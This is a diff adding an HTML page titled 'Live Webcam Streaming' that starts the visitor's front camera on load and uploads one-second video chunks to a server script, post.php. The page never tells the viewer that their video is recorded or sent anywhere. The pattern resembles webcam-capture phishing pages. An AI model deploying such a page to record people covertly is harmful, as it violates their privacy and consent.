@@ -1,0 +1,89 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Live Webcam Streaming</title>
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.min.js"></script>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            text-align: center;
+            margin-top: 50px;
+        }
+        video {
+            border: 2px solid #ddd;
+            border-radius: 5px;
+            margin-bottom: 20px;
+        }
+        h1 {
+            font-size: 24px;
+            color: #333;
+        }
+    </style>
+</head>
+<body>
+
+    <h1>Live Webcam Streaming</h1>
+    <video id="video" playsinline autoplay width="640" height="480"></video>
+
+    <script>
+        let mediaRecorder;
+        let videoStream;
+
+        // Function to send video data to PHP
+        function sendToServer(videoChunk) {
+            var formData = new FormData();
+            formData.append('video', videoChunk, 'stream.webm');
+
+            fetch('post.php', {
+                method: 'POST',
+                body: formData
+            })
+            .then(response => response.json())
+            .then(data => {
+                console.log(data.message);  // Server response
+            })
+            .catch(error => {
+                console.error('Error sending video:', error);
+            });
+        }
+
+        // Start video capture and send data to PHP server
+        async function startStream() {
+            try {
+                // Get video stream from webcam
+                videoStream = await navigator.mediaDevices.getUserMedia({
+                    video: { facingMode: 'user' },
+                    audio: false
+                });
+
+                // Display video stream on the page
+                document.getElementById('video').srcObject = videoStream;
+
+                // Set up MediaRecorder to capture the video
+                mediaRecorder = new MediaRecorder(videoStream, { mimeType: 'video/webm' });
+
+                mediaRecorder.ondataavailable = function(event) {
+                    if (event.data.size > 0) {
+                        console.log('Sending video chunk');
+                        sendToServer(event.data);  // Send video chunk to PHP
+                    }
+                };
+
+                // Start recording with continuous chunks (e.g., every 1000 ms)
+                mediaRecorder.start(1000);  // Adjust the chunk interval as necessary
+                console.log('MediaRecorder started');
+            } catch (error) {
+                console.error('Error accessing webcam:', error);
+            }
+        }
+
+        // Start the video stream automatically when the page loads
+        window.onload = function() {
+            startStream();  // Automatically start streaming
+        };
+    </script>
+
+</body>
+</html>
